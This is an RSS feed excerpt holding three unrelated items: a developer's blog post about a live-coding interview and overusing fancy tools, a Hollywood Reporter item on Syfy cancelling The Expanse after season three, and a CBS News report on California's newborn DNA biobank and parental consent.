<description>&lt;p&gt;&lt;img src=&quot;https://imgs.xkcd.com/comics/containers.png&quot; alt=&quot;Containers&quot;/&gt;&lt;/p&gt;
&lt;p&gt;I have been job hunting in the last 2 months or so. Thankfully, I am settled with a company I admire now, and it seemed like I had more luck than the average job applicant. But among the handful of companies that I had the pleasure to interview with, I had my fair share of interesting moments.&lt;/p&gt;
&lt;p&gt;The very first interview I had with a startup company was one of them. I mentioned in the resume I sent that I made an distro for the Raspberry Pi called Crankshaft, which is related to the work that they are doing and got a phone interview appointment. We chatted for a bit to introduce ourselves to each other. After 30 minutes, I was asked whether I was in front of a computer (implying it will be a live coding exercise) out of the blue. To set the record straight, I'm totally happy to do live coding exercises, and I understand companies are fed up with impostors who &quot;inflated&quot; their experiences on their resume. However, in that instance, there was no indication it was coming even in the interview appointment email. Nonetheless, I figured I can swallow it. After all, I have been programming for more than a half of my life. I figured being able to code spontaneously shows that I am a fearless ninja warrior when it comes to programming :^).&lt;/p&gt;
&lt;p&gt;I was presented with a Leetcode-esque question. After the clarifications about assumptions and requirements, I said, &quot;I can do it in two commands chained by a pipe in bash.&quot; And he said, let's treat it like a real CS question. So I asked, what languages can I code in, and the answer was any programming language I like. So I chose to program in Go. Now, when it comes to live coding challenges, one of the biggest problems is that the interviewer always knows the optimal answer when the applicant most likely can only come up with a suboptimal one given a very short time allowance. In a relatively successful interview, either the optimal solution is found when the two parties work on the plan of attack before the coding phase, or in the Q&amp;amp;A phase when a potential question or hint is presented to the interviewee. I presented the general direction I would take (by the way, &quot;translating&quot; the solution from bash is forbidden). In this case, I did not come up with the optimal algorithm but nonetheless, we agreed to proceed to the coding phase. In the Q&amp;amp;A session, the interviewer asked me why did I choose Go but not C. My answer was I would always choose Go over C if memory or performance is not a required constraint. Go is easier to work with and less boilerplate to worry about. Then, the interviewer mentioned something about a solution involving hashes that makes the lookup operation O(1) and I disagreed with him, so then we settled on them being &quot;practically O(1).&quot; We had another exchange when he poked on my function that potentially use memcpy under the hood, and pointed out it was O(n) instead of O(1) as I claimed. Finally, we talked about some other stuff and I could sense that the interviewer being disappointed when I didn't come up with the optimal answer. I answered something like &quot;I honestly don't know the answer for it – there are more things that I don't know than things I do know.&quot; He asked, &quot;But didn't you write an embedded OS?&quot;. Then I realized that he was expecting me to be using C and coming up with the most optimal answer, and not taking &quot;I don't know&quot; for an answer because I wrote an embedded OS. So I told him &quot;Oh, it is actually written in bash, you can see it on Github,&quot; and I can feel that he wasn't very impressed by my leet bash programming skillz. The interview concluded not long after. I sent him a thank-you email but never heard back.&lt;/p&gt;
&lt;p&gt;I guess I didn't qualify for the next round and was eliminated straight out. I don't intend to write this post to bash the interviewer or to say I should have been qualified – I didn't and I deserved it.&lt;/p&gt;
&lt;p&gt;I think though, there is something to say about the virtue of having, expecting, and imposing artificial constraints when it comes to problem-solving in general.&lt;/p&gt;
&lt;p&gt;Truth to be told, more than 95% of Crankshaft code is written in bash. I am not even a leet bash programmer. I still have to look up &quot;bash equality syntax&quot; when I need to do a number comparison because the syntax confuses me (I remember the string equality syntax now, though).&lt;/p&gt;
&lt;p&gt;That brings me back to the past. After dropping out of college in Vietnam years ago, I had the pleasure to work on a much less technically-demanding job in a small company that resells various specialized software packages. I had the chance to interact a lot with the CEO and the CTO. I first heard the quote &quot;if all you have is a hammer, everything looks like a nail&quot; from the CTO, which has since become one of my favorite ones. The CEO told me he studied Vovinam, a Vietnamese martial art. He told me that one of the main themes of Vovinam is using &quot;soft&quot; to win over &quot;hard.&quot; Essentially, it means whenever possible, one should exert the least energy, basically choose the path of least resistance to achieve what they want to do. In overall, I learned the spirit from both of them: It is important to first think about the goal rather than the mean.&lt;/p&gt;
&lt;p&gt;The trend of using hard technology is prevalent in tech-savvy people. Just today, someone asked on a forum about using their phone to VNC to their Raspberry Pi to watch Youtube videos because they are inspired by the lack of Adblock on the Youtube app on mobile. They started worrying about Bluetooth and battery constraints, and VNC, and using Bluetooth, and bandwidth and interference between Bluetooth and Wifi. Which is indeed solvable by googling &quot;youtube client without ads&quot; and you'll see NewPipe among the top results, which is an app you can install in 30 seconds to solve the problem. But when you have a hammer that is the Raspberry Pi, the Adblock problem starts to look like a nail.&lt;/p&gt;
&lt;p&gt;Recently, a close friend of mine who is a founder of a small company back home asked me to advise him on making a website/app to have &quot;Uber for X&quot; (X being his non-tech business). Upon talking, I realized if he wants to compete by making a good website/app, it's both hard and expensive to do. If his tech model turns out to be relatively successful, a medium-sized company in tech will be able to easily copy his model and out-compete him. Perhaps all he wants to do only need a website to advertise but he doesn't need a website or an app to execute. All he needs is an Excel spreadsheet and a relatively competent secretary to manage that spreadsheet and call people with demand and supply. But when you have a hammer that is Uber, the supply-and-demand problem starts to look like a nail, even when you don't have millions of people using it in real-time.&lt;/p&gt;
&lt;p&gt;And I see the same trend in Machine learning, Big data, AI, Cryptocurrency, Internet of Things, Social networks, Decentralized networks, etc. Everything in life, however trivial or hard, is a nail that can be solved with those fancy hammers. So we can have a tablet juxtaposed on a fridge, a bluetooth speaker integrated to a salt shaker, a subscription model for juicers, and machine learning for all kinds of social problems.&lt;/p&gt;
&lt;p&gt;I enjoy hard problems a lot. In the last couple of years, working on CUDA kernels to do parallel string comparison is one of the topics I busted my chops on. Some problems are extremely hard and need really clever algorithms and tuning to solve. But alongside with those, there are problems that only need a generally good idea to solve with very little hard code required.&lt;/p&gt;

&lt;p&gt;And that's the moment of enlightenment: Writing dumb scripts may become my niche as a person who &quot;wrote an embedded OS.&quot;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Edit: I want to make it clear that you understand that I might have been disqualified due to failing to provide the optimal answer, and having a misconception about memcpy's complexity, and maybe a lot of other reasons I cannot tell. I don't mind that the interviewer had a mix up between distro and OS. The main issue here is that the saga happened because the interviewer had seen the 'superior' solution involving hashes, thus had to make rules and critisisms to other solutions. The out-of-place question was just the epitome of the disconnection between the two parties. A useful product, as well as a useful answer, can be written in a language or done in a way you don't expect.&lt;/em&gt;&lt;/p&gt;

<title>&amp;#039;The Expanse&amp;#039; Canceled at Syfy</title>

<guid isPermaLink="true" >https://www.hollywoodreporter.com/live-feed/expanse-canceled-at-syfy-1110985</guid>
<description>&lt;div id=&quot;&quot;&gt;
&lt;p&gt;The current third season of the drama starring Steven Strait will be its last.&lt;/p&gt;
&lt;/div&gt;&lt;div id=&quot;&quot;&gt;&lt;p&gt;The current third season of Syfy drama &lt;em&gt;The Expanse&lt;/em&gt; will be its last.&lt;/p&gt;
&lt;p&gt;The NBCUniversal-owned cable network has made the decision to end the space drama with season three. The show's June 27 season finale will now serve as its series finale.&lt;/p&gt;
&lt;p&gt;Starring Steven Strait and based on James S.A. Corey's best-selling book series of the same name, in the series written by Daniel Abraham and Ty Franck, Syfy only had the rights to the first-run linear episodes in the U.S. That limited the upside for the cable network, making live and linear viewership imperative.&lt;/p&gt;
&lt;p&gt;Opening to promising reviews and a strong collection of loyal viewers, its first season averaged 581,000 viewers in the advertiser-coveted adults 18-49 demographic, and 1.4 million total viewers with three days of DVR. Season two, which returned more than a year later with a significant marketing push and a solid lead-in, was down 24 percent among total viewers and averaged 457,000 total viewers. That compares more to similar returns for Syfy's inexpensive co-productions like &lt;em&gt;Dark Matter&lt;/em&gt; and &lt;em&gt;Killjoys,&lt;/em&gt; than to the cabler's original scripted series like &lt;em&gt;The Magicians&lt;/em&gt; and &lt;em&gt;Happy&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Its third season, which returned in April, tumbled another 5 percent among total viewers and 12 percent in the demo from season two.  &lt;/p&gt;
&lt;p&gt;&quot;&lt;em&gt;The Expanse&lt;/em&gt; transported us across the solar system for three brilliant seasons of television. Everyone at Syfy is a massive fan of the series, and this was an incredibly difficult decision,&quot; said Chris McCumber, president of entertainment networks at NBCU Cable Entertainment. &quot;We want to sincerely thank &lt;em&gt;The Expanse&lt;/em&gt;’s amazing cast, crew and all the dedicated creatives who helped bring James S.A. Corey’s story to life. And to the series’ loyal fans, we thank you most of all.”&lt;/p&gt;
&lt;p&gt;The decision to bring &lt;em&gt;The Expanse&lt;/em&gt; to its end comes as Syfy has a packed scripted roster that also includes the upcoming George R.R. Martin drama &lt;em&gt;Nightflyers, The Purge, &lt;a href=&quot;https://www.hollywoodreporter.com/live-feed/deadly-class-russo-brothers-picked-up-series-at-syfy-1103735&quot;&gt;Deadly Class&lt;/a&gt;, Krypton&lt;/em&gt;, &lt;em&gt;The Magicians&lt;/em&gt;, anthology &lt;em&gt;Channel Zero&lt;/em&gt;, &lt;em&gt;Van Helsing,&lt;/em&gt; &lt;em&gt;Wynonna Earp&lt;/em&gt; and &lt;em&gt;Killjoys,&lt;/em&gt; with the latter set to wrap in 2019. &lt;em&gt;The Expanse&lt;/em&gt; will be Syfy's second series to conclude this year, joining &lt;em&gt;12 Monkeys.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Starring Strait, Shohreh Aghdashloo and Dominique Tipper, &lt;em&gt;The Expanse&lt;/em&gt; is set in a future where humanity has colonized the solar system. Mark Fergus and Hawk Ostby (&lt;em&gt;Children of Men&lt;/em&gt;) served as showrunners and exec produced the Alcon TV Group drama alongside Naren Shankar.&lt;/p&gt;

<title>DNA of every baby born in California is stored. Who has access to it?</title>
<link>https://www.cbsnews.com/news/california-biobank-dna-babies-who-has-access</link>
<guid isPermaLink="true" >https://www.cbsnews.com/news/california-biobank-dna-babies-who-has-access</guid>
<description>&lt;p&gt;&lt;strong&gt;SAN FRANCISCO --&lt;/strong&gt; You probably know where your Social Security card, birth certificate and other sensitive information is being stored, but what about your genetic material? If you or your child was born in California after 1983, your DNA is likely being stored by the government, may be available to law enforcement and may even be in the hands of outside researchers, &lt;a href=&quot;http://sanfrancisco.cbslocal.com/2018/05/08/california-biobank-stores-baby-dna-access/&quot; target=&quot;_blank&quot;&gt;CBS San Francisco's Julie Watts reports&lt;/a&gt;. &lt;/p&gt;
&lt;p&gt;Like many states, California collects bio-samples from every child born in the state. The material is then stored indefinitely in a state-run biobank, where it may be purchased for outside research.&lt;/p&gt;
&lt;p&gt;State law requires that parents are informed of their right to request the child's sample be destroyed, but the state does not confirm parents actually get that information before storing or selling their child's DNA.&lt;/p&gt;
&lt;p&gt;KPIX has learned that most parents are not getting the required notification. We've also discovered the DNA may be used for more than just research.&lt;/p&gt;
&lt;p&gt;In light of the Cambridge Analytica-Facebook scandal and the use of unidentified DNA to catch the Golden State Killer suspect, there are new concerns about law enforcement access, and what private researchers could do with access to the DNA from every child born in the state.&lt;/p&gt;
&lt;h3&gt;The Lifesaving Test&lt;/h3&gt;
&lt;p&gt;It all begins with a crucial and potentially lifesaving blood test.&lt;/p&gt;
&lt;p&gt;The Newborn Genetic Screening test is required in all 50 states, and is widely believed to be a miracle of modern medicine.&lt;/p&gt;
&lt;p&gt;Nearly every baby born in the United States gets a heel prick shortly after birth. Their newborn blood fills six spots on a special filter paper card. It is used to test baby for dozens of congenital disorders that, if treated early enough, could prevent severe disabilities and even death.&lt;/p&gt;
&lt;p&gt;It's estimated that newborn screening leads to a potentially life-saving early diagnosis each year for 5,000 to 6,000 children nationwide&lt;em&gt;.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The California Department of Public Health reports that from 2015-2017 alone, the Newborn Screening test diagnosed 2,498 babies with a &quot;serious congenital disorder that, if left untreated could have caused irreparable harm or death.&quot;&lt;/p&gt;
&lt;p&gt;But, unless you or your child is diagnosed with one of these disorders, the test is often lost in the fog of childbirth.&lt;/p&gt;
&lt;p&gt;We randomly selected six new moms and asked what they knew about their child's genetic test.&lt;/p&gt;
&lt;p&gt;Three of the moms remembered the heel prick, while the other three say they think they knew about the test. But, like most parents, none knew what happened to their baby's leftover blood spots after the test.&lt;/p&gt;
&lt;p&gt;They were shocked when KPIX reporter Julie Watts explained it to them.&lt;/p&gt;
&lt;h3&gt;Your rights after the test&lt;/h3&gt;
&lt;p&gt;The lab generally only needs a few of the blood spots for the baby's own potentially lifesaving genetic test. They use to collect five blood spots total from each child in California, they've now increased that to six.&lt;/p&gt;
&lt;p&gt;Some states destroy the blood spots after a year, 12 states store them for at least 21 years.&lt;/p&gt;
&lt;p&gt;California, however, is one of a handful of states that stores the remaining blood spots for research indefinitely in a state-run biobank.&lt;/p&gt;
&lt;p&gt;Even though the parents pay for the lifesaving test itself, the child's leftover blood spots become property of the state and may be sold to outside researchers without the parent's knowledge or consent.&lt;/p&gt;
&lt;p&gt;&quot;I just didn't realize there was a repository of every baby born in the state. It's like fingerprints,&quot; new mom Soniya Sapre responded.&lt;/p&gt;
&lt;p&gt;Amanda Feld, who had her daughter 15 months ago, was concerned in light of recurring data breaches. &quot;We know that companies aren't very good at keeping data safe. They try,&quot; she said.&lt;/p&gt;
&lt;p&gt;New mom Nida Jafri chimed in, &quot;There should be accountability and transparency on what it's being used for.&quot;&lt;/p&gt;
&lt;p&gt;&quot;Blood is inherently or intrinsically identifiable,&quot;added Sapre.&lt;/p&gt;
&lt;p&gt;Some states allow parents to opt-in or give informed consent before they store the child's sample.&lt;/p&gt;
&lt;p&gt;In California, however, in order to get the potentially lifesaving genetic test for your child, you have no choice but to allow the state to collect and store the remaining samples.&lt;/p&gt;
&lt;p&gt;You do have the right to ask the biobank to destroy the leftovers after the fact, though the &lt;a href=&quot;https://www.cdph.ca.gov/Programs/CFH/DGDS/Pages/nbs/nbsnpp.aspx&quot;&gt;agency's website states&lt;/a&gt; it &quot;may not be able to comply with your request.&quot;&lt;/p&gt;
&lt;p&gt;You also have the right to find out if your child's blood spots have been used for research, but you would have to know they were being used in the first place and we've discovered that most parents don't.&lt;/p&gt;
&lt;h3&gt;Samples used to save more lives&lt;/h3&gt;
&lt;p&gt;Dr. Fred Lorey, the former director of the California Genetic Disease Screening Program, explained that blood spot samples are invaluable to researchers.&lt;/p&gt;
&lt;p&gt;&quot;They're important because these samples are needed to create new testing technology,&quot; Lorey said.&lt;/p&gt;
&lt;p&gt;He explained that they're primarily used to identify new diseases and improve the current tests, ultimately saving more babies&lt;/p&gt;
&lt;p&gt;With nearly 500,000 births a year, California's biobank is, by far, the largest and is crucial for research nationwide.&lt;/p&gt;
&lt;p&gt;According to the Department of Public Health, more than 9.5 million blood spot samples have been collected since 2000 alone. The state has stored blood spots since 1983.&lt;/p&gt;
&lt;p&gt;As a result, California can now test newborns for more than 80 different disorders, more than any other state. The standard panel nationwide is around 30 disorders.&lt;/p&gt;
&lt;p&gt;But researchers with the California Genetic Disease Screening Program aren't the only ones with access to samples stored in the biobank.&lt;/p&gt;
&lt;p&gt;Blood spots are given to outside researchers for $20 to $40 per spot.&lt;/p&gt;
&lt;p&gt;Regulations require that the California Genetic Disease Screening Program to be self-supporting.&lt;/p&gt;
&lt;p&gt;&quot;It has to pay for itself,&quot; Lorey noted. Allowing outside researchers to buy newborn bloodspots helps to recoup costs.&lt;/p&gt;
&lt;p&gt;According to biobank records, the program sold about 16,000 blood spots over the past five years, totaling a little more than $700,000. By comparison, the program reported $128 million in revenue during the last fiscal year alone, mostly generated by the fees parents pay for the test. Parents are charged around $130 on their hospital bill for the Newborn Screening Test itself.&lt;/p&gt;
&lt;h3&gt;Making money off your DNA&lt;/h3&gt;
&lt;p&gt;But while the state may not be making money off your child's DNA, Lorey admitted that there is the potential for outside researchers to profit off your child's genetic material.&lt;/p&gt;
&lt;p&gt;&quot;Do any of those studies result in something that the company can make money from?&quot; reporter Julie Watts asked Lorey in a recent interview. &quot;Could they create a test or treatment that they ultimately profit from?&quot;&lt;/p&gt;
&lt;p&gt;&quot;Theoretically, yes,&quot; Lorey admitted. &quot;I'm not aware of any cases that that's happened because virtually all, not all, of these researchers that have made requests are scientific researchers.&quot;&lt;/p&gt;
&lt;p&gt;He explained that researchers who request the spots must meet specific criteria. Their studies must first be approved by a review board. They're also supposed to return or destroy remaining blood spot samples after use.&lt;/p&gt;
&lt;p&gt;However, privacy advocates point to the Cambridge Analytica-Facebook scandal where third-party researchers were supposed to destroy data, but instead used it for profit – and untimely to attempt to influence a presidential election.&lt;/p&gt;
&lt;p&gt;Watts pressed Lorey on that point.&lt;/p&gt;
&lt;p&gt;&quot;So there is no possibility a researcher may request blood spots for a specific research experiment … but then keep blood spots without the department's knowledge to be used for other purposes?&quot; she asked.&lt;/p&gt;
&lt;p&gt;&quot;I want to say no&quot; he said. &quot;But I'm not ready to say no because I know how humans can be sometimes.&quot;&lt;/p&gt;
&lt;h3&gt;&quot;De-identified DNA&quot;&lt;/h3&gt;
&lt;p&gt;However, Lorey stressed that the blood spots cards, stored in the state biobank, are &quot;de-identified.&quot; There is no name or medical information on the card, just the blood spots and a number.&lt;/p&gt;
&lt;p&gt;Lorey explained the identifying information is stored in a separate building and after a few years is microfiched so it's not even kept on a server. Samples do need to be re-identified for various reasons, but Lorey says, in those cases, parents are notified.&lt;/p&gt;
&lt;p&gt;And to be clear, he stressed, there is also no genome database. The state does not sequence or extract the DNA from the blood spots collected, although a researcher might, depending on the study.&lt;/p&gt;
&lt;p&gt;Privacy advocates, like Consumer Watchdog's Jamie Court insist DNA is inherently identifiable.&lt;/p&gt;
&lt;p&gt;&quot;There is no such thing as de-identified DNA,&quot; Court said. &quot;The very nature of DNA is that it identifies you and your genetic code specifically.&quot;&lt;/p&gt;
&lt;p&gt;Court points to the recent case of the Golden State Killer. Investigators used public ancestry sites to identify a murder suspect using decades-old unidentified DNA from a crime scene.&lt;/p&gt;
&lt;p&gt;And we've learned, researchers aren't the only ones with access to the blood spots.&lt;/p&gt;
&lt;h3&gt;Law enforcement access&lt;/h3&gt;
&lt;p&gt;A public records request revealed coroners often use blood spots to identify bodies, and at least one parent requested blood spots to prove paternity.&lt;/p&gt;
&lt;p&gt;Law enforcement also can — and does — request identified blood spots. We found at least five search warrants and four court orders, including one to test a child's blood for drugs at birth.&lt;/p&gt;
&lt;p&gt;According to the Department Of Public Health, &quot;Only a court order can provide a third-party (including law enforcement) access to an identified stored specimen without parental consent.&quot;&lt;/p&gt;
&lt;p&gt;&quot;I think the storage of DNA for purposes other than medical research without informed consent clearly is violating a duty and a trust that the state has to the public,&quot; Court said. &quot;What are they trying to hide?&quot;&lt;/p&gt;
&lt;h3&gt;State law says parents should know -- they don't&lt;/h3&gt;
&lt;p&gt;According to the Department of Public Health, it's not hiding anything. The agency points to page 13 of the &lt;a href=&quot;https://www.cdph.ca.gov/Programs/CFH/DGDS/CDPH%20Document%20Library/NBS%20Documents/NewbornScreeningBookletEN-Web.pdf&quot; target=&quot;_blank&quot;&gt;Newborn Screening brochure&lt;/a&gt; which does disclose that the blood spots are stored.&lt;/p&gt;
&lt;p&gt;&quot;In addition to being available on the Internet in multiple languages, healthcare providers give the brochure to parents prenatally and at birthing centers and hospitals,&quot; the Department of Public Health stated.&lt;/p&gt;
&lt;p&gt;We asked the six new moms to bring in all the paperwork they collected from the hospital. Only one of the six women actually had the required newborn screening pamphlet and she admitted that between delivering a baby and learning to raise a tiny human, she hadn't found the time to flip to page 13.&lt;/p&gt;
&lt;p&gt;&quot;I feel like that's something that should have been discussed with us in person, not on whatever page in a document,&quot; another new mom, Lesley Merritt, responded.&lt;/p&gt;
&lt;p&gt;Argelia Barcena added that they were not told the pamphlet was crucial or mandatory reading material.  &quot;I saw it as reference material, to refer to if needed, they dont tell you 'you must read it,'&quot; she pointed out.&lt;/p&gt;
&lt;p&gt;Keep in mind new parents are generally sent home with folders full of paperwork including a variety of medical testing forms and pamphlets with information ranging from breastfeeding and vaccines, to sudden infant death and CPR.&lt;/p&gt;
&lt;p&gt;&quot;Everyone who came into our room gave us another pamphlet,&quot; New Mom Amanda Feld pointed out.&lt;/p&gt;
&lt;p&gt;In the case of the Genetic Screening Pamphlet, the moms agreed they wouldn't have thought it was relevant to read after the fact unless their child was actually diagnosed.&lt;/p&gt;
&lt;p&gt;And they're not alone. We conducted an exclusive Survey USA news poll of parents with kids born in California over the past five years.&lt;/p&gt;
&lt;p&gt;While a majority of parents reported that they did know about the life-saving test, three-quarters said they didn't know the state would store the leftover blood spots indefinitely for research, and two-thirds weren't sure they ever got the newborn screening information.&lt;/p&gt;
&lt;p&gt;When we read the six moms that portion of page 13 that disclosed the blood spots could be used for outside research, they noted that it's not clear the blood spots are stored indefinitely, available to law enforcement, nor that using blood spots for &quot;department approved studies&quot; means giving them to outside researchers.&quot; P.13 states:&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&quot;Are the stored blood spots used for anything else? Yes. California law requires the NBS program to use or provide newborn screening specimens for department approved studies of diseases in women and children, such as research related to identify-ing and preventing disease.&quot;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Lorey helped draft previous versions of the pamphlet. He agreed that the portion on page 13 &quot;could be clarified,&quot; but he said he believed the information included provides &quot;adequate disclosure.&quot;&lt;/p&gt;
&lt;p&gt;He was surprised, however, when Watts showed him all the forms she was sent home from the hospital with and he acknowledged it could be difficult for parents to digest it all while also learning to care for a newborn.&lt;/p&gt;
&lt;p&gt;He was also surprised to see the version of the newborn screening brochure that Watts was given.&lt;/p&gt;
&lt;p&gt;Instead of the required 14-page pamphlet with the storage disclosure on page 13, she had a one page, tri-fold hand-out with no mention of storage, or a parent's right to opt out of it. Instead there was a web link where parents could go &quot;For more information…&quot;&lt;/p&gt;
&lt;h3&gt;Required disclosure&lt;/h3&gt;
&lt;p&gt;State regulations say that parents are supposed to get the full 14 page pamphlet twice, once &lt;a href=&quot;https://govt.westlaw.com/calregs/Document/IFB4CF9C0D60511DE88AEDDE29ED1DC0A?viewType=FullText&amp;amp;originationContext=documenttoc&amp;amp;transitionType=CategoryPageItem&amp;amp;contextData=(sc.Default)&amp;amp;bhcp=1&quot;&gt;before &lt;/a&gt;their due date, and again in the &lt;a href=&quot;https://govt.westlaw.com/calregs/Document/IFB8065D0D60511DE88AEDDE29ED1DC0A?viewType=FullText&amp;amp;originationContext=documenttoc&amp;amp;transitionType=CategoryPageItem&amp;amp;contextData=(sc.Default)&amp;amp;bhcp=1&quot;&gt;hospital before&lt;/a&gt; the heel prick test.&lt;/p&gt;
&lt;p&gt;But in practice, most parents say they didn't even see the pamphlet until after the test, if they got it at all.&lt;/p&gt;
&lt;p&gt;While the state says it &quot;distributes more than 700,000 copies of the booklets to health providers each year,&quot; it admits that it doesn't track whether doctors are giving them out. It also does not confirm parents are informed of their rights to opt out of storage before storing or selling the child's DNA.&lt;/p&gt;
&lt;h3&gt;Federal law&lt;/h3&gt;
&lt;p&gt;Under &lt;a href=&quot;https://www.congress.gov/bill/113th-congress/house-bill/1281&quot;&gt;federal law&lt;/a&gt;, blood spots are currently defined as human subjects, and therefore require informed consent for federal research. But, that doesn't apply to private researchers, and even &lt;a href=&quot;http://wayback.archive-it.org/3926/20170127095200/https:/www.hhs.gov/about/news/2017/01/18/final-rule-enhances-protections-research-participants-modernizes-oversight-system.html&quot;&gt;that protection is about to expire when a new federal policy&lt;/a&gt;, known as the Common Rule, takes effect this year.&lt;/p&gt;
&lt;p&gt;Following strong opposition from the research community, proposed protections for unidentified bio-specimens were stripped from the final rule. This means researchers won't need consent to use de-identified blood spots, and, in some cases, can even use identified blood spots without consent.&lt;/p&gt;
&lt;p&gt;It's ultimately up to each state to develop their own policies on disclosure. Parents in  Texas successfully sued the state, ultimately forcing their biobank to destroy samples taken for research without consent or disclosure.&lt;/p&gt;
&lt;h3&gt;State law&lt;/h3&gt;
&lt;p&gt;In California, &lt;a href=&quot;https://leginfo.legislature.ca.gov/faces/codes_displayText.xhtml?lawCode=HSC&amp;amp;division=106.&amp;amp;title=&amp;amp;part=5.&amp;amp;chapter=1.&amp;amp;article=2.&quot;&gt;the newborn screening law&lt;/a&gt; doesn't actually authorize the state to store a child's leftover blood spots after the test, or give it to outside researchers, it only authorizes the life-saving genetic test itself.&lt;/p&gt;
&lt;p&gt;However, &lt;a href=&quot;https://leginfo.legislature.ca.gov/faces/codes_displayText.xhtml?lawCode=HSC&amp;amp;division=106.&amp;amp;title=&amp;amp;part=5.&amp;amp;chapter=1.&amp;amp;article=2.&quot;&gt;the newborn screening law&lt;/a&gt; does say that state may store samples of the &lt;a href=&quot;https://leginfo.legislature.ca.gov/faces/codes_displaySection.xhtml?lawCode=HSC&amp;amp;sectionNum=125002.&quot;&gt;mother's prenatal blood&lt;/a&gt;, which is taken early in the pregnancy, but only if the mother opts in.&lt;/p&gt;
&lt;p&gt;Parents don't get to opt in to storing their baby's DNA however and that was not decided by voters or lawmakers.&lt;/p&gt;
&lt;p&gt;While the newborn screening law was enacted by the state legislature, the authorization to store every child's DNA and sell it to researchers is actually in a &lt;a href=&quot;https://govt.westlaw.com/calregs/Document/IC9192264D42B4EFE8CB380BA82722D23?viewType=FullText&amp;amp;originationContext=documenttoc&amp;amp;transitionType=CategoryPageItem&amp;amp;contextData=(sc.Default)&quot;&gt;separate regulation&lt;/a&gt; enacted by the Director of California Department of Public Health. It says that a child's &quot;blood specimen and information,&quot; collected during a test paid for by the child's parents, becomes &quot;property of the state.&quot;&lt;/p&gt;
&lt;p&gt;&quot;Any tissue sample that is given in a hospital or any medical facility, once it's given, is no longer your property,&quot; Lorey explained. &quot;You can agree with that or disagree with that, but it happens to be the law.&quot;&lt;/p&gt;
&lt;p&gt;In 2015, former California Assemblyman Mike Gatto introduced a law that would have initially made both the test and storage opt-in. It was strongly opposed by the powerful hospital and research lobbies, and after several revisions, it died in the Senate Health Committee.&lt;/p&gt;
&lt;p&gt;Health advocates said their primary opposition at the time was due to the fact that Gatto's bill would have made both the test and storage opt in, and since the test itself is crucial to saving lives, they said the test should not be optional.&lt;/p&gt;
&lt;p&gt;Researchers, on the other hand, oppose letting parents opt in to the storage too because they believe they would get fewer samples if parents had a choice.&lt;/p&gt;
&lt;p&gt;But, that doesn't seem to be the case in California.&lt;/p&gt;
&lt;h3&gt;Calif. moms opt in to prenatal&lt;/h3&gt;
&lt;p&gt;Along with newborn blood spots, the California Genetic Disease Screening Program also tests mothers' blood in the first and second trimesters, and they're allowed to opt in.&lt;/p&gt;
&lt;p&gt;About 90 percent of pregnant women do opt in to letting the state store their own blood for research. And, unlike the newborn screening test, a majority of moms said they do remember the disclosures and pamphlets about their own genetic test, because they got them early in the pregnancy.&lt;/p&gt;
&lt;p&gt;Eighty four percent of parents surveyed said they think they should get information about their child's genetic screening at the same time they learn about their own. That would give them time — several months without the distraction of a newborn — to process the information and understand their rights before the child is born.&lt;/p&gt;
&lt;p&gt;Many said they also should have the right to opt out of storage before their child's DNA is stored, or at least give informed consent before it is sold for research.&lt;/p&gt;
&lt;h3&gt;The problem with opting in &lt;/h3&gt;
&lt;p&gt;Critics of the opt-in option point to Texas. Following a lawsuit by parents, the biobank was forced to destroy blood spots that were taken without consent to store them for research. Now Texas allows parents to opt-in to storage.&lt;/p&gt;
&lt;p&gt;When the potentially life-saving screening test is given in Texas, a storage consent form with a matching ID number is given to the parents to take home from the hospital and review. Blood spots are not stored in the biobank unless parents sign and return the consent form. As a result, a significant percentage of samples are destroyed.&lt;/p&gt;
&lt;p&gt;Critics note that many parents never return the form, likely in part due to the distractions of a new baby.&lt;/p&gt;
&lt;p&gt;Ultimately, that hurts the biobank and researchers because they get fewer samples, and more importantly, fewer samples from certain communities.&lt;/p&gt;
&lt;p&gt;This means that research performed with those samples may not be valid for the entire population. In contrast, research performed with samples from California's biobank is considered very strong and applicable to all babies.&lt;/p&gt;
&lt;h3&gt;A Calif. opt-in solution&lt;/h3&gt;
&lt;p&gt;Parents and advocates we spoke with in California would like to see the informed consent given out early in the pregnancy, long before the due date, which may lead to a higher opt-in rate than in Texas.&lt;/p&gt;
&lt;p&gt;An opt-in early in the pregnancy would require a system in place to match the mothers' consent forms, collected in the first trimester, with the babies' blood spots, collected months later by hospital staff.&lt;/p&gt;
&lt;p&gt;Lorey said California already has a similar matching system in place for the prenatal genetic test so it does seem feasible.&lt;/p&gt;
&lt;p&gt;Court believes parents should have the right to opt-in before their baby's genetic material is collected and stored indefinitely by the state, though that would be fought hard by the powerful hospital and research lobbies in Sacramento.&lt;/p&gt;
&lt;p&gt;&quot;Informed consent basically means we should know what we're donating a sample for,&quot; Court said. &quot;If hospitals and the medical complex is so concerned that if we knew that we might not donate our samples, than we absolutely need to know what they're doing with them because it suggests there is a purpose beyond what we know.&quot;&lt;/p&gt;
&lt;p&gt;Meanwhile, a majority of parents surveyed said they would have opted-in to storage if given the chance.&lt;/p&gt;
&lt;p&gt;Additionally, they said they're more likely to destroy their child's sample now than they would have been if they had been notified of their rights to begin with.&lt;/p&gt;
&lt;p&gt;Both the California Hospital Association and the March of Dimes, which opposed previous legation that would have allowed parents to opt-in, say they are now open to improving the way the state informs parents that their child's samples will be stored and &quot;may be used to advance research.&quot;&lt;/p&gt;
&lt;p&gt;However, neither has an official position on allowing parents to opt-in to storage.&lt;/p&gt;
&lt;p&gt;Short of an opt-in, Court said he thinks there should at least be a tracking mechanism to ensure every parent is getting complete and accurate information about the storage early in the pregnancy, before the DNA samples are stored.&lt;/p&gt;
&lt;p&gt;Since state law already requires prenatal doctors to provide the information, Court notes, it wouldn't be a stretch to require they also get a signature from moms, allowing the state to track whether or not parents are actually getting the information.&lt;/p&gt;
&lt;h3&gt;What next? &lt;/h3&gt;
&lt;p&gt;So the questions remain: Should parents have the right to know that their child's DNA will be stored indefinitely in a state-run biobank and may be available to law enforcement? Should the state have to confirm that parents are informed of their rights before it stores and sells the child's DNA? Who has the power to make that happen?&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cdph.ca.gov/Pages/KarenSmithWelcome.aspx&quot;&gt;Karen Smith, appointed by Governor Brown,&lt;/a&gt; is the current Director of the Department of Public Health. She has the power to adopt new regulations.&lt;/p&gt;
